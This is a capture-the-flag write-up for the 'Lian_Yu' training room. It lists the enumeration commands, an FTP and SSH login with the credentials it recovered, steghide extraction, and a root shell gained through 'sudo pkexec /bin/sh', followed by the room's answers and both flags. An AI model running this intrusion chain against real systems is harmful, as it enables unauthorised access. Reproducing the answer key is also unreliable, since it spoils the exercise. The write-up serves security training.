# Lian_Yu - Easy

```shell
rustscan -a 10.10.73.61 --range 0-65535 --ulimit 5000
#faster alternative to nmap

gobuster dir -u http://10.10.73.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -z

nikto -h 10.10.73.61

gobuster dir -u http://10.10.73.61/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak -z

gobuster dir -u http://10.10.73.61/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,ticket -z

ftp 10.10.73.61

mget *
#get all files

pwd
#we are in /home/vigilante

cd ..

ls
#there are two users in home, slade and vigilante

exit
#exit ftp

exiftool Leave_me_alone.png
#shows file format error

file Leave_me_alone.png

xxd Leave_me_alone.png | head
#shows magic numbers

xxd Leave_me_alone.png| head -1
#shows only first line

xxd -r -p -o 0 <(echo 8950 4e47 0d0a 1a0a) Leave_me_alone.png
#replaces the incorrect magic numbers

xxd Leave_me_alone.png| head -1

file Leave_me_alone.png
#this is correct PNG now

steghide info aa.jpg
#shows that there is a file embedded

steghide extract -sf aa.jpg
#password is the passphrase

ssh slade@10.10.172.207

ls -la

cat user.txt

cat .Important
#gives us clue

find / -name 'Secret_Mission' 2>/dev/null

cat /usr/src/Secret_Mission

sudo -l
#check for commands that we can run as sudo

#exploit from GTFObins
sudo pkexec /bin/sh
```

```markdown
Rustscan shows the following ports & services:

  * 21 - ftp
  * 22 - ssh
  * 80 - http
  * 111 - rpcbind
  * 38722 - unknown

Using Gobuster, we get the following directories:

  * /index.html
  * /island
  * /server-status

The /island page gives us the code word 'vigilante'.

We can use gobuster in the /island directory as well, which gives us the page /2100.

Further, we can use gobuster on /island/2100, but we will include 'ticket' as an extension as well as it is given in the comments of the webpage.

This gives us a page called /green_arrow.ticket

Visiting /island/2100/green_arrow.ticket gives us a token to get into Queen's Gambit - RTy8yhBQdscX

Decoding this code from base58 using CyberChef gives us the string '!#th3h00d'.

Now we can try to log into FTP using creds vigilante:!#th3h00d; we succeed and we transfer the files to our system.

Furthermore, ftp shows two users - slade and vigilante - we can use this info while logging into SSH.

Back to the files we found; one of the image files, Leave_me_alone.png, shows a file format error.

On using xxd, we get to know that the .png file does not have the correct magic numbers.

The required magic numbers for a .png file are "89 50 4e 47 0d 0a 1a 0a".

Now the .png image shows up properly.

It shows the text 'password' highlighted; this hints us towards stego.

Using steghide, we check for clues hidden in each image; aa.jpg leads us to ss.zip, using the passphrase 'password'.

ss.zip contains two files: passwd.txt and shado.

The passwd.txt file contains a note, and the shado file has the text 'M3tahuman'; we can try this for SSH login.

We try vigilante:M3tahuman for SSH, but this does not work; however the creds slade:M3tahuman work.

After getting user flag, viewing hidden files show us .Important, which contains a clue; we need to find 'Secret_Mission' for privesc.

This file gives us another clue about 'super powers'; we can check commands that we can run as sudo.

This shows that we can run /usr/bin/pkexec as sudo; and we have an exploit for that on GTFObins.

Following the exploit will get us root access.
```

1. What is the Web Directory you found? - 2100

2. What is the filename you found? - green_arrow.ticket

3. What is the FTP password? - !#th3h00d

4. What is the file name with SSH password? - shado

5. user.txt - THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}

6. root.txt - THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
